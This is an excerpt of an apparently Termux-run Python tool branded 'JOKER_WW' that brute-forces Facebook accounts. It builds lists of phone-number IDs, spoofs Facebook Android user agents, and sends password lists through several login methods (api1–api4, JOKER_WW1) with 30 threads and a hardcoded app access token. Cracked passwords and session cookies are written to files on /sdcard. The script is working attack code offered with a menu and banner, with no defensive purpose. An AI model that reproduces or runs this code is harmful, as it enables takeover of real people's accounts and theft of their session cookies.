...
fbbd = subprocess.check_output('getprop ro.product.JOKER_WW',shell=True).decode('utf-8').replace('\n','')
fbdv = model
...
def ua():
	...
	JOKER_WW  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/196.0.0.50;FBBV/778106255;FBDM/{density=1.0,width=1080,height=1920};FBLC/pt_PT;FBRV/617550850;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A225M;FBSV/9.0.5;nullFBCA/armeabi-v7a:armeabi;]"
	ua = random.choice([f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))",])+JOKER_WW
	return ua
def iAmMethod2Ua():
...
##     ## ##   ##   ######### ##  #### ##     ## 
##     ## ##    ##  ##     ## ##   ### ##     ## 
########  ##     ## ##     ## ##    ## ######## x3 \033[1;92m𝐁𝐀𝐀𝐏 𝐁𝐀𝐀𝐏 𝐇𝐎𝐓𝐀 𝐇𝐄"    
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;37m[\033[1;37m+\033[1;37m]\033[1;37m 𝐀𝐔𝐓𝐇𝐎𝐑   \033[1;37m:\033[1;37m 𝐁𝐑𝐀𝐍𝐃
\033[1;37m[\033[1;37m+\033[1;37m]\033[1;37m 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 \033[1;37m:\033[1;37m 𝐎𝐘𝐄 𝐇𝐄𝐑𝐎
\033[1;37m[\033[1;37m+\033[1;37m]\033[1;37m 𝐕𝐄𝐑𝐒𝐈𝐎𝐍  \033[1;37m:\033[91;1m 0.5
\033[1;37m[\033[1;37m+\033[1;37m]\033[1;37m 𝐒𝐓𝐀𝐓𝐔𝐒   \033[1;37m:\033[1;37m 𝐅𝐑𝐄𝐄 
...
def menu():
			clear()
		#	linex()
			print(' [1] 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 [2] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 [3] 𝐆𝐀𝐌𝐈𝐋 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 [4] 𝐉𝐎𝐈𝐍 𝐖𝐇𝐀𝐓𝐒𝐀𝐏 𝐆𝐑𝐎𝐔𝐏[0] 𝐄𝐗𝐈𝐓 𝐌𝐄𝐍𝐔')
			linex()
...
def pak():
		user=[]
		clear()
		print('\033[1;91m Code example: 9370,9377,0335,0345')
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as JOKER_WW:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					JOKER_WW.submit(JOKER_WW1,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [JOKER_WW-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JOKER_WW-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/JOKER_WW-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/JOKER_WW-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[JOKER_WW-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [JOKER_WW-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOKER_WW-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/JOKER_WW-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [JOKER_WW-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [JOKER_WW-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOKER_WW-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [JOKER_WW-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [JOKER_WW-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Chromium";v="107", "Not=A?JOKER_WW";v="24", "Chromium";v="107.0.5304.74", "Not=A?JOKER_WW";v="24.0.0.0"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			JOKER_WW=session.cookies.get_dict().keys()
			if "c_user" in JOKER_WW:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [JOKER_WW-OK] %s | %s'%(ids,pas))
				open('/sdcard/JOKER_WW-OK.txt', 'a').write(ids+'|'+pas+'\n')
				open('/sdcard/JOKER_WW-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in JOKER_WW:
				if 'y' in pcp:
					print('\r\r\033[1;91m [JOKER_WW-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/JOKER_WW-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
	...
	loop+=1
#method1rnd
def JOKER_WW1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [JOKER_WW-RNDM] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [JOKER_WW-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JOKER_WW-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [JOKER_WW-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JOKER_WW-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
